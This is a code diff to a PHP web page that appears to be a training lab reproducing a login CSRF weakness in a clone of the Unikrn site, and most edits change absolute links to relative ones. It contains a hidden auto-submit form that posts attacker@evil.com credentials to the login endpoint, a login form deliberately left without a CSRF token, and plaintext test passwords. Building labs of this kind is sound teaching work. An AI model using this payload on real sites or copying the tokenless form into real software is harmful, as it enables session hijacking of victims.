@@ -38,7 +38,7 @@ if (!$db || $db->connect_error) {
 }
 $db->set_charset('utf8mb4');
 
-$baseUri = $_SERVER['SCRIPT_NAME'] ?? '/subdomains/identity/index.php';
+$baseUri = $_SERVER['SCRIPT_NAME'] ?? '';
 $loginUrl     = $baseUri;
 $dashboardUrl = $baseUri . '?action=dashboard';
 $registerUrl  = $baseUri . '?action=register';
@@ -375,7 +375,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
     <!-- ⚠ CSRF FORM: POSTs attacker credentials to Unikrn's login endpoint.
          No CSRF token — Unikrn's /apiv1/login doesn't require one.
          Victim clicks → their session is replaced with attacker's account. -->
-    <form id="csrfForm" action="/index.php" method="POST">
+    <form id="csrfForm" action="index.php" method="POST">
       <input type="hidden" name="usr" value="attacker@evil.com">
       <input type="hidden" name="pwd" value="attacker456">
     </form>
@@ -413,7 +413,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
      ══════════════════════════════════════════════════════════════════════════ -->
 <div class="uk-body">
   <nav class="uk-nav">
-    <a href="/index.php?action=dashboard" class="uk-logo">
+    <a href="index.php?action=dashboard" class="uk-logo">
       <div class="uk-logo-mark">U</div>
       <span class="uk-logo-text">Uni<span>krn</span></span>
     </a>
@@ -422,7 +422,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
       <a href="#" class="uk-nav-link">Games</a>
       <a href="#" class="uk-nav-link">Live</a>
       <a href="#" class="uk-nav-link">Scoreboard</a>
-      <a href="/index.php?action=dashboard" class="uk-nav-link cur">Dashboard</a>
+      <a href="index.php?action=dashboard" class="uk-nav-link cur">Dashboard</a>
     </div>
     <div class="uk-nav-right">
       <div class="uk-coins-pill">
@@ -433,14 +433,14 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
         <div class="uk-av"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
         <?= esc($currentUser['username']) ?>
       </div>
-      <a href="/index.php?logout=1" class="uk-logout">Sign out</a>
+      <a href="index.php?logout=1" class="uk-logout">Sign out</a>
     </div>
   </nav>
 
   <div class="uk-dash">
     <aside class="uk-sidebar">
       <div class="uk-sb-title">Main</div>
-      <a href="/index.php?action=dashboard" class="uk-sb-link active">
+      <a href="index.php?action=dashboard" class="uk-sb-link active">
         <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
         Dashboard
       </a>
@@ -633,7 +633,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
       <?php if ($error): ?>
       <div class="uk-error"><?= esc($error) ?></div>
       <?php endif; ?>
-      <form method="POST" action="/index.php?action=register">
+      <form method="POST" action="index.php?action=register">
         <div class="uk-field">
           <label>Email Address</label>
           <input type="email" name="usr" placeholder="you@example.com" required autocomplete="email">
@@ -645,7 +645,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
         <button type="submit" class="uk-btn-submit">Create Account</button>
       </form>
       <div class="uk-auth-foot">
-        Already have an account? <a href="/index.php">Sign in</a>
+        Already have an account? <a href="index.php">Sign in</a>
       </div>
     </div>
   </div>
@@ -676,7 +676,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 
       <!-- ⚠ VULNERABLE: No CSRF token field. No hidden token. POST /apiv1/login
            accepts usr+pwd from ANY origin with no session or token validation. -->
-      <form method="POST" action="/index.php">
+      <form method="POST" action="index.php">
         <div class="uk-field">
           <label>Email</label>
           <input type="email" name="usr" placeholder="your@email.com" required autocomplete="email">
@@ -706,7 +706,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
         <div class="uk-ta-row"><span class="uk-ta-email">apex@unikrn.com</span><span class="uk-ta-pass">apex@123</span><span class="uk-ta-badge">User</span></div>
       </div>
       <div class="uk-auth-foot">
-        New to Unikrn? <a href="/index.php?action=register">Create account</a>
+        New to Unikrn? <a href="index.php?action=register">Create account</a>
       </div>
     </div>
   </div>
